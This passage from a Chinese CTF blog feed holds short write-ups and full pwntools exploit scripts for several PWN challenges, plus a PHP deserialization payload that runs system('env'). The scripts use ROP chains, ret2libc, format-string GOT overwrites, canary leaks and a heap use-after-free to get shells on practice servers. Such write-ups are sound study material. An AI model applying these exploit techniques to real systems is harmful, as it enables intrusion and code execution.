pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000496710) # add rax, 1 ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000402404) # syscall</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20+0x8)+p</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"sdctf-2022horoscope\"><a class=\"anchor\" href=\"#sdctf-2022horoscope\">#</a> [SDCTF 2022]Horoscope</h5>\n<blockquote>\n<p>利用这个 atoi 去是 a1 等于 1 这个 s 的话是需要使用 0x38 才能溢出，那么的话利用使一个 b'a'*0x38 等于 b'1'+b'a'*0x38 因为 atoi 只会转换数字为整数，所以我们可以利用这个点去得到让这个程序完整运行，然后就是一个简单的 ret2text 了</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">#p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28120)</span><br><span class=\"line\">p=process(&#x27;./horoscope&#x27;)</span><br><span class=\"line\">elf=ELF(&#x27;horoscope&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#payload=b&#x27;1&#x27;+b&#x27;a&#x27;*(0x30+0x7)+p64(elf.sym[&#x27;debug&#x27;])+p64(elf.sym[&#x27;test&#x27;])</span><br><span class=\"line\">payload=b&#x27;1&#x27;+b&#x27;a&#x27;*(0x37)+p64(0x40095F)</span><br><span class=\"line\">p.sendlineafter(b&#x27;pe&#x27;,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020babyrop2\"><a class=\"anchor\" href=\"#bjdctf-2020babyrop2\">#</a> [BJDCTF 2020]babyrop2</h5>\n<blockquote>\n<p>这个题讲究的是 ret2libc 注意字符串溢出为 7 即可按照 ret2libc 打就行</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28241)</span><br><span class=\"line\"></span><br><span class=\"line\">#p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;u!\\n&#x27;,&#x27;%7$p&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;0x&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">a=int(p.recv(16),16)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(a))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got=elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi=0x400993</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">main=elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">vuln=elf.sym[&#x27;vuln&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">ret=0x4005f9</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&#x27;ory!\\n&#x27;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">base_addr=u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(base_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">puts=LibcSearcher(&#x27;puts&#x27;,base_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base=base_addr-puts.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=libc_base+puts.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">bin_sh=libc_base+puts.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x20-0x8)+p64(a)+p64(0)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(&#x27;ory!\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"bjdctf-2020ydsneedgirlfriend\"><a class=\"anchor\" href=\"#bjdctf-2020ydsneedgirlfriend\">#</a> [BJDCTF 2020]YDSneedGirlfriend</h5>\n<blockquote>\n<p>这个题又是一个堆的题要好好的利用 uaf 去得到 shell<br />\n 首先我们看到这个题目是有一个 free 来释放内存但是并没有给指针清零导致再次分配时在被占用，并且 show 函数可以来调用指针指到的函数将被调用</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(&#x27;node4.anna.nssctf.cn&#x27;,28732)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">def add(size,name):</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(str(1))</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;size is :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(str(size))</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;ame is :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\">#    sh.recvuntil(&quot;choice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">def delete(index):</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendlineafter(&#x27;:&#x27;,&#x27;2&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;Index :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">#    sh.recvuntil(&quot;choice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">def show(idx):</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.recvuntil(&#x27;choice :&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendline(&#x27;3&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    sh.sendlineafter(&#x27;Index :&#x27;,str(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">sh.recvuntil(&quot;oice :&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x10,&#x27;aaaaa&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x20,&#x27;bbbbb&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(0)</span><br><span class=\"line\"></span><br><span class=\"line\">delete(1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =p64(0x400B9C)</span><br><span class=\"line\"></span><br><span class=\"line\">add(0x10,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">show(0)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"gdouctf-2023奇怪的elf\"><a class=\"anchor\" href=\"#gdouctf-2023奇怪的elf\">#</a> [GDOUCTF 2023] 奇怪的 ELF</h5>\n<blockquote>\n<p>一个离谱的架构题目，两个文件一个是 x86_64 (arm64) 一个是 arm64 所以第二个因为环境原因无法运行，把 linux2 里面的 flag 转换为 16 进制然后在 python 进行一次异或运算即可得到 flag2</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=[</span><br><span class=\"line\">  0xF2, 0xEE, 0xE3, 0xD9, 0xCA, 0xEF, 0xE8, 0xF3, 0xFE, 0xD9,</span><br><span class=\"line\">  0xF1, 0xE9, 0xF4, 0xEA, 0xE2, 0xA7, 0xFB</span><br><span class=\"line\">]</span><br><span class=\"line\">for i in flag:</span><br><span class=\"line\">    print(chr(i^0x86),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hdctf-2023makewish\"><a class=\"anchor\" href=\"#hdctf-2023makewish\">#</a> [HDCTF 2023]Makewish</h5>\n<blockquote>\n<p>这个题目很有意思需要自己多次调试才能知道具体的解决办法综合了前面的很多知识点</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">import ctypes #这里调用了一个伪随机数</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27; #日志</span><br><span class=\"line\">libc=ctypes.CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class=\"line\">libc.srand(1) #srand</span><br><span class=\"line\">while 1:</span><br><span class=\"line\">\tp=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">\t#p=remote(&#x27;node4.anna.nssctf.cn&#x27;,28492)</span><br><span class=\"line\">\tpayload=b&#x27;a&#x27;*(0x30-0x8)</span><br><span class=\"line\">\tp.sendline(payload)</span><br><span class=\"line\">\tp.recvuntil(payload)</span><br><span class=\"line\">\tcanary=u64(p.recv(8))-0x0a</span><br><span class=\"line\">\tlog.info(hex(canary))</span><br><span class=\"line\">\trand=libc.rand()%1000+324</span><br><span class=\"line\">\tp.sendafter(&#x27;key\\n&#x27;,p32(rand))</span><br><span class=\"line\">\tpayload=p64(0x4007C7)+p64(canary)</span><br><span class=\"line\">\tp.sendlineafter(&#x27;me&#x27;,payload)</span><br><span class=\"line\">\tp.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>利用 puts 得到 canary。</p>\n<h5 id=\"ciscn-2019华中pwn1\"><a class=\"anchor\" href=\"#ciscn-2019华中pwn1\">#</a> [CISCN 2019 华中] PWN1</h5>\n<p>常规 ret2libc 直接打</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">from LibcSearcher import *</span><br><span class=\"line\">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&#x27;./CISCN_PWN1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">#io = process(&#x27;./pwn&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io=remote(&#x27;node5.anna.nssctf.cn&#x27;,28793)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">Padding = b&#x27;\\x00&#x27; + b&#x27;A&#x27; * (0x50 + 0x08 - 0x01)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">main = elf.sym[&#x27;main&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">rdi = 0x400C83</span><br><span class=\"line\">ret = 0x4006B9</span><br><span class=\"line\">io.recvuntil(b&#x27;choice!\\n&#x27;)</span><br><span class=\"line\">io.sendline(b&#x27;1&#x27;)</span><br><span class=\"line\">io.recvuntil(b&#x27;encrypted\\n&#x27;)</span><br><span class=\"line\">Payload = Padding + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(Payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;Ciphertext\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[:6].ljust(8, b&#x27;\\x00&#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(hex(addr))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(&#x27;puts&#x27;, addr)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_addr = addr-libc.dump(&#x27;puts&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_addr+libc.dump(&#x27;system&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">sh_addr = libc_addr+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;choice!\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(b&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;encrypted\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Payload_2 = Padding + p64(ret) + p64(rdi) + p64(sh_addr) + p64(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(Payload_2)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"moectf-2022babyfmt\"><a class=\"anchor\" href=\"#moectf-2022babyfmt\">#</a> [MoeCTF 2022]babyfmt</h5>\n<p>查看到这个题很简单的处理方法，里面有个 printf (buf) 可以直接判断为字符串溢出，没开 FULL，基本思路就是格式化字符串劫持 got 表，找到偏移之后试了几种修改，改发可以说是多种多样了。接收 backdoor 没啥用，可以改 got 表直接用 system 的 got 表就行，如果开 FULL RELRO 的话可以覆盖 ret 地址，给的地址还有点用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">#p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28523)</span><br><span class=\"line\">print_got=elf.got[&#x27;printf&#x27;]</span><br><span class=\"line\">p.recvuntil(&quot;\\n&quot;)</span><br><span class=\"line\">p.sendline(&quot;%10$s&quot;)</span><br><span class=\"line\">baskdoor=int(p.recv(9),16)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=fmtstr_payload(11,&#123;print_got:baskdoor&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"ciscn_2019_ne_5\"><a class=\"anchor\" href=\"#ciscn_2019_ne_5\">#</a> ciscn_2019_ne_5</h4>\n<blockquote>\n<p>注意 scanf 里面也给了 sh 和 system 直接打<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./ciscn_2019_ne_5&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;node4.buuoj.cn&quot;,25421)</span><br><span class=\"line\"></span><br><span class=\"line\">#p=process(&quot;./ciscn_2019_ne_5&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(b&quot;password:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(b&quot;administrator&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">def add(text):</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(b&quot;1&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&quot;nfo:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\">def et():</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(b&quot;4&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x48+4)+p32(system)+b&#x27;\\x01\\x01\\x01\\x01&#x27;+p32(0x80482ea)</span><br><span class=\"line\"></span><br><span class=\"line\">add(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">et()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/WEB%E5%88%B7%E9%A2%98-md/",
            "url": "https://lookhui.github.io/WEB%E5%88%B7%E9%A2%98-md/",
            "title": "WEB刷题解析",
            "date_published": "2023-12-12T13:39:15.000Z",
            "content_html": "<h5 id=\"hznuctf-2023-preliminaryppppop\"><a class=\"anchor\" href=\"#hznuctf-2023-preliminaryppppop\">#</a> [HZNUCTF 2023 preliminary]ppppop</h5>\n<p>打开页面没有显示东西打开 f12 查看网络有一个 cookie:user 尝试将字符串进行 base64 解密发现是一个验证已经显示是 isadmin 那么在让他变成 1 就行，然后输入 header 里面去查看到源码就是一个反序列化，我们要注意的是 strrev 和 python 的 [::-1] 一样将字符串反转</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A &#123;</span><br><span class=\"line\">    public $className=&quot;B&quot;;</span><br><span class=\"line\">    public $funcName=&quot;system&quot;;</span><br><span class=\"line\">    public $args=&quot;env&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() &#123;</span><br><span class=\"line\">        $class = new $this-&gt;className;</span><br><span class=\"line\">        $funcName = $this-&gt;funcName;</span><br><span class=\"line\">        $class-&gt;$funcName($this-&gt;args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class B &#123;</span><br><span class=\"line\">    public function __call($func, $arg) &#123;</span><br><span class=\"line\">        $func($arg[0]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a=new A();</span><br><span class=\"line\">echo strrev(serialize($a));</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"hznuctf-2023-preliminaryguessguessguess\"><a class=\"anchor\" href=\"#hznuctf-2023-preliminaryguessguessguess\">#</a> [HZNUCTF 2023 preliminary]guessguessguess</h5>\n<p>很简单直接使用 python 的 [::-1] 即可得到 strrev 反过来的，<br />\n贴上源码这个题我打不开环境</p>\n<p><figure class=\"highlight 